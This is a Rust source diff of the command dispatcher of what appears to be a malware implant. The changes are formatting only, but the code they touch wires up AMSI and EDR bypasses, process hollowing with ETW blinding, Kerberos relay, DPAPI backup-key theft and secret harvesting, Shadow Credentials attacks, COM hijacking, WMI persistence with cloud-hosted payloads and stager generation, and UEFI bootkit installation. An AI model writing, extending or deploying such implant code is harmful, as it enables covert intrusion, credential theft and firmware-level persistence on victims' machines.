@@ -528,8 +528,8 @@ pub async fn handle_command(
         #[cfg(not(feature = "self-reencode"))]
         Command::SetReencodeSeed { .. } => Err("self-reencode feature not enabled".to_string()),
 
-        /// MorphNow: immediately re-encode .text with the supplied seed and
-        /// return the SHA-256 hash of the resulting .text section.
+        // MorphNow: immediately re-encode .text with the supplied seed and
+        // return the SHA-256 hash of the resulting .text section.
         #[cfg(feature = "self-reencode")]
         Command::MorphNow { seed } => match crate::self_reencode::morph_now(seed) {
             Ok(hash) => {
@@ -1309,13 +1309,13 @@ pub async fn handle_command(
         Command::AmsiBypassMode { .. } => Err("AMSI bypass requires Windows".to_string()),
 
         // ── Evanesco continuous memory hiding ────────────────────────────
-        /// Return status of the Evanesco page-tracker subsystem.
+        // Return status of the Evanesco page-tracker subsystem.
         #[cfg(all(windows, feature = "evanesco"))]
         Command::EvanescoStatus => Ok(crate::page_tracker::status_json()),
         #[cfg(not(all(windows, feature = "evanesco")))]
         Command::EvanescoStatus => Err("evanesco feature not enabled".to_string()),
 
-        /// Dynamically adjust the Evanesco idle threshold.
+        // Dynamically adjust the Evanesco idle threshold.
         #[cfg(all(windows, feature = "evanesco"))]
         Command::EvanescoSetThreshold { idle_ms } => {
             crate::page_tracker::set_idle_threshold(idle_ms);
@@ -1365,7 +1365,7 @@ pub async fn handle_command(
         Command::KernelCallbackRestore => Err("kernel-callback feature not enabled".to_string()),
 
         // ── EDR bypass transformation engine ─────────────────────────────
-        /// Scan .text for known EDR byte signatures.
+        // Scan .text for known EDR byte signatures.
         #[cfg(feature = "evasion-transform")]
         Command::EvasionTransformScan => match crate::edr_bypass_transform::scan_for_signatures() {
             Ok(hits) => match serde_json::to_string_pretty(&hits) {
@@ -1377,7 +1377,7 @@ pub async fn handle_command(
         #[cfg(not(feature = "evasion-transform"))]
         Command::EvasionTransformScan => Err("evasion-transform feature not enabled".to_string()),
 
-        /// Run one scan-and-transform cycle.
+        // Run one scan-and-transform cycle.
         #[cfg(feature = "evasion-transform")]
         Command::EvasionTransformRun => {
             let cfg = config.lock().await.clone();
@@ -1397,13 +1397,13 @@ pub async fn handle_command(
         #[cfg(not(feature = "evasion-transform"))]
         Command::EvasionTransformRun => Err("evasion-transform feature not enabled".to_string()),
 
-        /// Query EDR bypass transform status (last scan hits, skipped, total transforms, timestamp).
+        // Query EDR bypass transform status (last scan hits, skipped, total transforms, timestamp).
         #[cfg(feature = "evasion-transform")]
         Command::EdrBypassStatus => Ok(crate::edr_bypass_transform::status()),
         #[cfg(not(feature = "evasion-transform"))]
         Command::EdrBypassStatus => Err("evasion-transform feature not enabled".to_string()),
 
-        /// NTFS transaction-based process hollowing with ETW blinding.
+        // NTFS transaction-based process hollowing with ETW blinding.
         #[cfg(all(windows, feature = "transacted-hollowing"))]
         Command::TransactedHollow {
             ref target_process,
@@ -1638,12 +1638,12 @@ pub async fn handle_command(
         // Query the current CET (Control-flow Enforcement Technology) /
         // shadow-stack status.  Returns a JSON object describing whether
         // CET is present, enabled, and which bypass strategy is active.
-        #[cfg(all(windows, feature = "cet-bypass"))]
+        #[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
         Command::CetStatus => {
             let status = crate::cet_bypass::status_json();
             Ok(status)
         }
-        #[cfg(not(all(windows, feature = "cet-bypass")))]
+        #[cfg(not(all(windows, feature = "cet-bypass", target_arch = "x86_64")))]
         Command::CetStatus => Err("cet-bypass feature not enabled".to_string()),
 
         // ── Token-only impersonation (Windows only) ─────────────────────────
@@ -1902,18 +1902,14 @@ pub async fn handle_command(
         )
         .map_err(|e| format!("Kerberos relay failed: {e:#}")),
         #[cfg(not(all(windows, feature = "kerberos-relay")))]
-        Command::KerberosRelay { .. } => {
-            Err("kerberos-relay feature not enabled".to_string())
-        }
+        Command::KerberosRelay { .. } => Err("kerberos-relay feature not enabled".to_string()),
 
         // List exploitable CLSIDs for Kerberos relay.
         #[cfg(all(windows, feature = "kerberos-relay"))]
         Command::KerberosRelayListClsids => crate::kerberos_relay::list_clsids_json()
             .map_err(|e| format!("Failed to list CLSIDs: {e:#}")),
         #[cfg(not(all(windows, feature = "kerberos-relay")))]
-        Command::KerberosRelayListClsids => {
-            Err("kerberos-relay feature not enabled".to_string())
-        }
+        Command::KerberosRelayListClsids => Err("kerberos-relay feature not enabled".to_string()),
 
         // ── DPAPI Backup Key ──────────────────────────────────────────
         // Retrieve the domain DPAPI backup key from a Domain Controller
@@ -1922,7 +1918,10 @@ pub async fn handle_command(
         #[cfg(all(windows, feature = "dpapi-backup"))]
         Command::DpapiBackupKeyRetrieve { dc_hostname } => {
             crate::dpapi_backup::retrieve_backup_key(dc_hostname.clone())
-                .map(|info| serde_json::to_string(&info).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                .map(|info| {
+                    serde_json::to_string(&info)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+                })
                 .map_err(|e| format!("Failed to retrieve DPAPI backup key: {e:#}"))
         }
         #[cfg(not(all(windows, feature = "dpapi-backup")))]
@@ -1935,7 +1934,11 @@ pub async fn handle_command(
         Command::DpapiBackupKeyHarvest { backup_key_hex, .. } => {
             match hex::decode(backup_key_hex) {
                 Ok(backup_key_data) => crate::dpapi_backup::harvest_dpapi_secrets(&backup_key_data)
-                    .map(|secrets| serde_json::to_string(&secrets).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                    .map(|secrets| {
+                        serde_json::to_string(&secrets).unwrap_or_else(|e| {
+                            format!("{{\"error\":\"serialization failed: {e}\"}}")
+                        })
+                    })
                     .map_err(|e| format!("Failed to harvest DPAPI secrets: {e:#}")),
                 Err(e) => Err(format!("Invalid backup key hex: {e}")),
             }
@@ -1947,17 +1950,18 @@ pub async fn handle_command(
 
         // Decrypt a single DPAPI blob using the domain backup key.
         #[cfg(all(windows, feature = "dpapi-backup"))]
-        Command::DpapiBackupKeyDecrypt { blob_hex, backup_key_hex } => {
-            match (hex::decode(blob_hex), hex::decode(backup_key_hex)) {
-                (Ok(blob_data), Ok(backup_key_data)) => {
-                    crate::dpapi_backup::decrypt_dpapi_blob(&blob_data, &backup_key_data)
-                        .map(|plaintext| hex::encode(&plaintext))
-                        .map_err(|e| format!("Failed to decrypt DPAPI blob: {e:#}"))
-                }
-                (Err(e), _) => Err(format!("Invalid blob hex: {e}")),
-                (_, Err(e)) => Err(format!("Invalid backup key hex: {e}")),
+        Command::DpapiBackupKeyDecrypt {
+            blob_hex,
+            backup_key_hex,
+        } => match (hex::decode(blob_hex), hex::decode(backup_key_hex)) {
+            (Ok(blob_data), Ok(backup_key_data)) => {
+                crate::dpapi_backup::decrypt_dpapi_blob(&blob_data, &backup_key_data)
+                    .map(|plaintext| hex::encode(&plaintext))
+                    .map_err(|e| format!("Failed to decrypt DPAPI blob: {e:#}"))
             }
-        }
+            (Err(e), _) => Err(format!("Invalid blob hex: {e}")),
+            (_, Err(e)) => Err(format!("Invalid backup key hex: {e}")),
+        },
         #[cfg(not(all(windows, feature = "dpapi-backup")))]
         Command::DpapiBackupKeyDecrypt { .. } => {
             Err("dpapi-backup feature not enabled".to_string())
@@ -1967,7 +1971,10 @@ pub async fn handle_command(
         #[cfg(all(windows, feature = "shadow-credentials"))]
         Command::ShadowCredentialsAttack { target } => {
             crate::shadow_credentials::shadow_credentials_attack(&target)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                .map(|result| {
+                    serde_json::to_string(&result)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+                })
                 .map_err(|e| format!("Shadow Credentials attack failed: {e:#}"))
         }
         #[cfg(not(all(windows, feature = "shadow-credentials")))]
@@ -1978,10 +1985,13 @@ pub async fn handle_command(
         #[cfg(all(windows, feature = "shadow-credentials"))]
         Command::ShadowCredentialsCheckAccess { target_dn } => {
             crate::shadow_credentials::check_write_access(&target_dn)
-                .map(|has_access| serde_json::to_string(&serde_json::json!({
-                    "target_dn": target_dn,
-                    "has_access": has_access,
-                })).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                .map(|has_access| {
+                    serde_json::to_string(&serde_json::json!({
+                        "target_dn": target_dn,
+                        "has_access": has_access,
+                    }))
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+                })
                 .map_err(|e| format!("Shadow Credentials check access failed: {e:#}"))
         }
         #[cfg(not(all(windows, feature = "shadow-credentials")))]
@@ -1992,11 +2002,14 @@ pub async fn handle_command(
         #[cfg(all(windows, feature = "shadow-credentials"))]
         Command::ShadowCredentialsCertGen { subject } => {
             crate::shadow_credentials::generate_self_signed_cert(&subject)
-                .map(|(private_key, cert_der)| serde_json::to_string(&serde_json::json!({
-                    "subject": subject,
-                    "private_key_hex": hex::encode(&private_key),
-                    "cert_der_hex": hex::encode(&cert_der),
-                })).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                .map(|(private_key, cert_der)| {
+                    serde_json::to_string(&serde_json::json!({
+                        "subject": subject,
+                        "private_key_hex": hex::encode(&private_key),
+                        "cert_der_hex": hex::encode(&cert_der),
+                    }))
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+                })
                 .map_err(|e| format!("Shadow Credentials cert gen failed: {e:#}"))
         }
         #[cfg(not(all(windows, feature = "shadow-credentials")))]
@@ -2005,115 +2018,132 @@ pub async fn handle_command(
         }
 
         // ── COM Object Hijacking (registry-free, activation context) ─────────
-
         #[cfg(all(windows, feature = "com-hijack"))]
-        Command::ComHijackManifest { clsid, proxy_dll_path, prog_id } => {
-            crate::com_hijack::generate_manifest(&clsid, &proxy_dll_path, prog_id.as_deref())
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("COM hijack manifest generation failed: {e:#}"))
-        }
+        Command::ComHijackManifest {
+            clsid,
+            proxy_dll_path,
+            prog_id,
+        } => crate::com_hijack::generate_manifest(&clsid, &proxy_dll_path, prog_id.as_deref())
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("COM hijack manifest generation failed: {e:#}")),
         #[cfg(not(all(windows, feature = "com-hijack")))]
-        Command::ComHijackManifest { .. } => {
-            Err("com-hijack feature not enabled".to_string())
-        }
+        Command::ComHijackManifest { .. } => Err("com-hijack feature not enabled".to_string()),
 
         #[cfg(all(windows, feature = "com-hijack"))]
-        Command::ComHijackActivateFile { manifest_path, clsid } => {
-            crate::com_hijack::activate_from_file(&manifest_path, &clsid)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("COM hijack file activation failed: {e:#}"))
-        }
+        Command::ComHijackActivateFile {
+            manifest_path,
+            clsid,
+        } => crate::com_hijack::activate_from_file(&manifest_path, &clsid)
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("COM hijack file activation failed: {e:#}")),
         #[cfg(not(all(windows, feature = "com-hijack")))]
-        Command::ComHijackActivateFile { .. } => {
-            Err("com-hijack feature not enabled".to_string())
-        }
+        Command::ComHijackActivateFile { .. } => Err("com-hijack feature not enabled".to_string()),
 
         #[cfg(all(windows, feature = "com-hijack"))]
-        Command::ComHijackActivateMemory { manifest_xml, clsid } => {
-            crate::com_hijack::activate_from_memory(&manifest_xml, &clsid)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("COM hijack memory activation failed: {e:#}"))
-        }
+        Command::ComHijackActivateMemory {
+            manifest_xml,
+            clsid,
+        } => crate::com_hijack::activate_from_memory(&manifest_xml, &clsid)
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("COM hijack memory activation failed: {e:#}")),
         #[cfg(not(all(windows, feature = "com-hijack")))]
         Command::ComHijackActivateMemory { .. } => {
             Err("com-hijack feature not enabled".to_string())
         }
 
         #[cfg(all(windows, feature = "com-hijack"))]
-        Command::ComHijackScanTargets => {
-            crate::com_hijack::scan_targets()
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("COM hijack target scan failed: {e:#}"))
-        }
+        Command::ComHijackScanTargets => crate::com_hijack::scan_targets()
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("COM hijack target scan failed: {e:#}")),
         #[cfg(not(all(windows, feature = "com-hijack")))]
-        Command::ComHijackScanTargets => {
-            Err("com-hijack feature not enabled".to_string())
-        }
+        Command::ComHijackScanTargets => Err("com-hijack feature not enabled".to_string()),
 
         #[cfg(all(windows, feature = "com-hijack"))]
-        Command::ComHijackProxyDll { clsid, original_handler } => {
-            crate::com_hijack::generate_proxy(&clsid, &original_handler)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("COM hijack proxy DLL generation failed: {e:#}"))
-        }
+        Command::ComHijackProxyDll {
+            clsid,
+            original_handler,
+        } => crate::com_hijack::generate_proxy(&clsid, &original_handler)
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("COM hijack proxy DLL generation failed: {e:#}")),
         #[cfg(not(all(windows, feature = "com-hijack")))]
-        Command::ComHijackProxyDll { .. } => {
-            Err("com-hijack feature not enabled".to_string())
-        }
+        Command::ComHijackProxyDll { .. } => Err("com-hijack feature not enabled".to_string()),
 
         // ── WMI Permanent Subscriptions with Encrypted Cloud Payloads ─────
-
         #[cfg(all(windows, feature = "wmi-persistence"))]
-        Command::WmiInstallSubscription { config_json } => {
-            serde_json::from_str::<crate::wmi_persistence::WmiSubscriptionConfig>(&config_json)
-                .map_err(|e| format!("Invalid WMI subscription config JSON: {e}"))
-                .and_then(|config| {
-                    crate::wmi_persistence::install_wmi_subscription(&config)
-                        .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                        .map_err(|e| format!("WMI subscription installation failed: {e:#}"))
+        Command::WmiInstallSubscription { config_json } => serde_json::from_str::<
+            crate::wmi_persistence::WmiSubscriptionConfig,
+        >(&config_json)
+        .map_err(|e| format!("Invalid WMI subscription config JSON: {e}"))
+        .and_then(|config| {
+            crate::wmi_persistence::install_wmi_subscription(&config)
+                .map(|result| {
+                    serde_json::to_string(&result)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                 })
-        }
+                .map_err(|e| format!("WMI subscription installation failed: {e:#}"))
+        }),
         #[cfg(not(all(windows, feature = "wmi-persistence")))]
         Command::WmiInstallSubscription { .. } => {
             Err("wmi-persistence feature not enabled".to_string())
         }
 
         #[cfg(all(windows, feature = "wmi-persistence"))]
-        Command::WmiRemoveSubscription { filter_name, consumer_name } => {
-            crate::wmi_persistence::remove_wmi_subscription(&filter_name, &consumer_name)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("WMI subscription removal failed: {e:#}"))
-        }
+        Command::WmiRemoveSubscription {
+            filter_name,
+            consumer_name,
+        } => crate::wmi_persistence::remove_wmi_subscription(&filter_name, &consumer_name)
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("WMI subscription removal failed: {e:#}")),
         #[cfg(not(all(windows, feature = "wmi-persistence")))]
         Command::WmiRemoveSubscription { .. } => {
             Err("wmi-persistence feature not enabled".to_string())
         }
 
         #[cfg(all(windows, feature = "wmi-persistence"))]
-        Command::WmiScanSubscriptions => {
-            crate::wmi_persistence::scan_wmi_subscriptions()
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("WMI subscription scan failed: {e:#}"))
-        }
+        Command::WmiScanSubscriptions => crate::wmi_persistence::scan_wmi_subscriptions()
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("WMI subscription scan failed: {e:#}")),
         #[cfg(not(all(windows, feature = "wmi-persistence")))]
-        Command::WmiScanSubscriptions => {
-            Err("wmi-persistence feature not enabled".to_string())
-        }
+        Command::WmiScanSubscriptions => Err("wmi-persistence feature not enabled".to_string()),
 
         #[cfg(all(windows, feature = "wmi-persistence"))]
-        Command::WmiCloudUpload { payload, cloud_config_json } => {
-            serde_json::from_str::<crate::wmi_persistence::CloudStorageConfig>(&cloud_config_json)
-                .map_err(|e| format!("Invalid cloud config JSON: {e}"))
-                .and_then(|config| {
-                    crate::wmi_persistence::encrypt_and_upload(&payload, &config)
-                        .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                        .map_err(|e| format!("WMI cloud upload failed: {e:#}"))
-                })
-        }
+        Command::WmiCloudUpload {
+            payload,
+            cloud_config_json,
+        } => serde_json::from_str::<crate::wmi_persistence::CloudStorageConfig>(&cloud_config_json)
+            .map_err(|e| format!("Invalid cloud config JSON: {e}"))
+            .and_then(|config| {
+                crate::wmi_persistence::encrypt_and_upload(&payload, &config)
+                    .map(|result| {
+                        serde_json::to_string(&result).unwrap_or_else(|e| {
+                            format!("{{\"error\":\"serialization failed: {e}\"}}")
+                        })
+                    })
+                    .map_err(|e| format!("WMI cloud upload failed: {e:#}"))
+            }),
         #[cfg(not(all(windows, feature = "wmi-persistence")))]
-        Command::WmiCloudUpload { .. } => {
-            Err("wmi-persistence feature not enabled".to_string())
-        }
+        Command::WmiCloudUpload { .. } => Err("wmi-persistence feature not enabled".to_string()),
 
         #[cfg(all(windows, feature = "wmi-persistence"))]
         Command::WmiGenerateStager { url, key_hex } => {
@@ -2124,147 +2154,179 @@ pub async fn handle_command(
                         arr.copy_from_slice(&decoded);
                         Ok(arr)
                     }
-                    Ok(_) => Err("Decryption key must be exactly 32 bytes (64 hex chars)".to_string()),
+                    Ok(_) => {
+                        Err("Decryption key must be exactly 32 bytes (64 hex chars)".to_string())
+                    }
                     Err(e) => Err(format!("Invalid hex key: {e}")),
                 }
             };
             match key_bytes_res {
                 Ok(kb) => crate::wmi_persistence::generate_stager_command(&url, &kb)
-                    .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                    .map(|result| {
+                        serde_json::to_string(&result).unwrap_or_else(|e| {
+                            format!("{{\"error\":\"serialization failed: {e}\"}}")
+                        })
+                    })
                     .map_err(|e| format!("WMI stager generation failed: {e:#}")),
                 Err(e) => Err(e),
             }
         }
         #[cfg(not(all(windows, feature = "wmi-persistence")))]
-        Command::WmiGenerateStager { .. } => {
-            Err("wmi-persistence feature not enabled".to_string())
-        }
+        Command::WmiGenerateStager { .. } => Err("wmi-persistence feature not enabled".to_string()),
 
         // ── UEFI Firmware-Level Persistence ───────────────────────────────
-
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiReadVariable { name, guid } => {
-            uefi_persistence::EfiGuid::parse(&guid)
-                .map_err(|e| format!("Invalid EFI GUID: {e:#}"))
-                .and_then(|g| {
-                    uefi_persistence::nvram::read_efi_variable(&name, &g)
-                        .map(|data| base64::engine::general_purpose::STANDARD.encode(&data))
-                        .map_err(|e| format!("UEFI variable read failed: {e:#}"))
-                })
-        }
+        Command::UefiReadVariable { name, guid } => uefi_persistence::EfiGuid::parse(&guid)
+            .map_err(|e| format!("Invalid EFI GUID: {e:#}"))
+            .and_then(|g| {
+                uefi_persistence::nvram::read_efi_variable(&name, &g)
+                    .map(|data| base64::engine::general_purpose::STANDARD.encode(&data))
+                    .map_err(|e| format!("UEFI variable read failed: {e:#}"))
+            }),
         #[cfg(not(feature = "uefi-persistence"))]
-        Command::UefiReadVariable { .. } => {
-            Err("uefi-persistence feature not enabled".to_string())
-        }
+        Command::UefiReadVariable { .. } => Err("uefi-persistence feature not enabled".to_string()),
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiWriteVariable { name, guid, data, attributes } => {
-            uefi_persistence::EfiGuid::parse(&guid)
-                .map_err(|e| format!("Invalid EFI GUID: {e:#}"))
-                .and_then(|g| {
-                    base64::engine::general_purpose::STANDARD
-                        .decode(&data)
-                        .map_err(|e| format!("Invalid base64 data: {e}"))
-                        .and_then(|data_bytes| {
-                            uefi_persistence::nvram::write_efi_variable(
-                                &name, &g, &data_bytes,
-                                uefi_persistence::EfiVarAttributes(attributes),
-                            )
-                            .map(|_| "OK".to_string())
-                            .map_err(|e| format!("UEFI variable write failed: {e:#}"))
-                        })
-                })
-        }
+        Command::UefiWriteVariable {
+            name,
+            guid,
+            data,
+            attributes,
+        } => uefi_persistence::EfiGuid::parse(&guid)
+            .map_err(|e| format!("Invalid EFI GUID: {e:#}"))
+            .and_then(|g| {
+                base64::engine::general_purpose::STANDARD
+                    .decode(&data)
+                    .map_err(|e| format!("Invalid base64 data: {e}"))
+                    .and_then(|data_bytes| {
+                        uefi_persistence::nvram::write_efi_variable(
+                            &name,
+                            &g,
+                            &data_bytes,
+                            uefi_persistence::EfiVarAttributes(attributes),
+                        )
+                        .map(|_| "OK".to_string())
+                        .map_err(|e| format!("UEFI variable write failed: {e:#}"))
+                    })
+            }),
         #[cfg(not(feature = "uefi-persistence"))]
         Command::UefiWriteVariable { .. } => {
             Err("uefi-persistence feature not enabled".to_string())
         }
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiEnumerateBootEntries => {
-            uefi_persistence::nvram::enumerate_boot_entries()
-                .map(|entries| serde_json::to_string(&entries).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("Boot entry enumeration failed: {e:#}"))
-        }
+        Command::UefiEnumerateBootEntries => uefi_persistence::nvram::enumerate_boot_entries()
+            .map(|entries| {
+                serde_json::to_string(&entries)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("Boot entry enumeration failed: {e:#}")),
         #[cfg(not(feature = "uefi-persistence"))]
         Command::UefiEnumerateBootEntries => {
             Err("uefi-persistence feature not enabled".to_string())
         }
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiModifyBootEntry { entry_num, new_path } => {
-            uefi_persistence::nvram::modify_boot_entry(entry_num, &new_path)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("Boot entry modification failed: {e:#}"))
-        }
+        Command::UefiModifyBootEntry {
+            entry_num,
+            new_path,
+        } => uefi_persistence::nvram::modify_boot_entry(entry_num, &new_path)
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("Boot entry modification failed: {e:#}")),
         #[cfg(not(feature = "uefi-persistence"))]
         Command::UefiModifyBootEntry { .. } => {
             Err("uefi-persistence feature not enabled".to_string())
         }
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiMountEsp => {
-            uefi_persistence::esp::mount_esp()
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                .map_err(|e| format!("ESP mount failed: {e:#}"))
-        }
+        Command::UefiMountEsp => uefi_persistence::esp::mount_esp()
+            .map(|result| {
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+            })
+            .map_err(|e| format!("ESP mount failed: {e:#}")),
         #[cfg(not(feature = "uefi-persistence"))]
-        Command::UefiMountEsp => {
-            Err("uefi-persistence feature not enabled".to_string())
-        }
+        Command::UefiMountEsp => Err("uefi-persistence feature not enabled".to_string()),
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiWriteDriver { esp_path, driver_name, driver_data, vendor } => {
-            base64::engine::general_purpose::STANDARD
-                .decode(&driver_data)
-                .map_err(|e| format!("Invalid base64 driver data: {e}"))
-                .and_then(|driver_bytes| {
-                    uefi_persistence::esp::write_efi_driver(&esp_path, &driver_name, &driver_bytes, vendor.as_deref())
-                        .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                        .map_err(|e| format!("EFI driver write failed: {e:#}"))
+        Command::UefiWriteDriver {
+            esp_path,
+            driver_name,
+            driver_data,
+            vendor,
+        } => base64::engine::general_purpose::STANDARD
+            .decode(&driver_data)
+            .map_err(|e| format!("Invalid base64 driver data: {e}"))
+            .and_then(|driver_bytes| {
+                uefi_persistence::esp::write_efi_driver(
+                    &esp_path,
+                    &driver_name,
+                    &driver_bytes,
+                    vendor.as_deref(),
+                )
+                .map(|result| {
+                    serde_json::to_string(&result)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                 })
-        }
+                .map_err(|e| format!("EFI driver write failed: {e:#}"))
+            }),
         #[cfg(not(feature = "uefi-persistence"))]
-        Command::UefiWriteDriver { .. } => {
-            Err("uefi-persistence feature not enabled".to_string())
-        }
+        Command::UefiWriteDriver { .. } => Err("uefi-persistence feature not enabled".to_string()),
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiBuildStub { payload_data, second_stage_path, entry_point_offset, chain_to_original, original_bootloader_path } => {
-            base64::engine::general_purpose::STANDARD
-                .decode(&payload_data)
-                .map_err(|e| format!("Invalid base64 payload data: {e}"))
-                .and_then(|payload_bytes| {
-                    let config = uefi_persistence::EfiPayloadConfig {
-                        payload_data: payload_bytes,
-                        second_stage_path,
-                        entry_point_offset,
-                        chain_to_original,
-                        original_bootloader_path,
-                    };
-                    uefi_persistence::driver_stub::build_efi_stub(&config)
-                        .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                        .map_err(|e| format!("EFI stub build failed: {e:#}"))
-                })
-        }
+        Command::UefiBuildStub {
+            payload_data,
+            second_stage_path,
+            entry_point_offset,
+            chain_to_original,
+            original_bootloader_path,
+        } => base64::engine::general_purpose::STANDARD
+            .decode(&payload_data)
+            .map_err(|e| format!("Invalid base64 payload data: {e}"))
+            .and_then(|payload_bytes| {
+                let config = uefi_persistence::EfiPayloadConfig {
+                    payload_data: payload_bytes,
+                    second_stage_path,
+                    entry_point_offset,
+                    chain_to_original,
+                    original_bootloader_path,
+                };
+                uefi_persistence::driver_stub::build_efi_stub(&config)
+                    .map(|result| {
+                        serde_json::to_string(&result).unwrap_or_else(|e| {
+                            format!("{{\"error\":\"serialization failed: {e}\"}}")
+                        })
+                    })
+                    .map_err(|e| format!("EFI stub build failed: {e:#}"))
+            }),
         #[cfg(not(feature = "uefi-persistence"))]
-        Command::UefiBuildStub { .. } => {
-            Err("uefi-persistence feature not enabled".to_string())
-        }
+        Command::UefiBuildStub { .. } => Err("uefi-persistence feature not enabled".to_string()),
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiInstallRuntimeDriver { driver_data, driver_name, esp_path, use_capsule } => {
-            base64::engine::general_purpose::STANDARD
-                .decode(&driver_data)
-                .map_err(|e| format!("Invalid base64 driver data: {e}"))
-                .and_then(|driver_bytes| {
-                    uefi_persistence::runtime_driver::install_runtime_driver(
-                        &driver_bytes, &driver_name, &esp_path, use_capsule,
-                    )
-                    .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
-                    .map_err(|e| format!("Runtime driver install failed: {e:#}"))
+        Command::UefiInstallRuntimeDriver {
+            driver_data,
+            driver_name,
+            esp_path,
+            use_capsule,
+        } => base64::engine::general_purpose::STANDARD
+            .decode(&driver_data)
+            .map_err(|e| format!("Invalid base64 driver data: {e}"))
+            .and_then(|driver_bytes| {
+                uefi_persistence::runtime_driver::install_runtime_driver(
+                    &driver_bytes,
+                    &driver_name,
+                    &esp_path,
+                    use_capsule,
+                )
+                .map(|result| {
+                    serde_json::to_string(&result)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                 })
-        }
+                .map_err(|e| format!("Runtime driver install failed: {e:#}"))
+            }),
         #[cfg(not(feature = "uefi-persistence"))]
         Command::UefiInstallRuntimeDriver { .. } => {
             Err("uefi-persistence feature not enabled".to_string())
@@ -2273,18 +2335,22 @@ pub async fn handle_command(
         #[cfg(feature = "uefi-persistence")]
         Command::UefiCheckCapsuleSupport => {
             uefi_persistence::runtime_driver::check_uefi_capsule_support()
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                .map(|result| {
+                    serde_json::to_string(&result)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+                })
                 .map_err(|e| format!("Capsule support check failed: {e:#}"))
         }
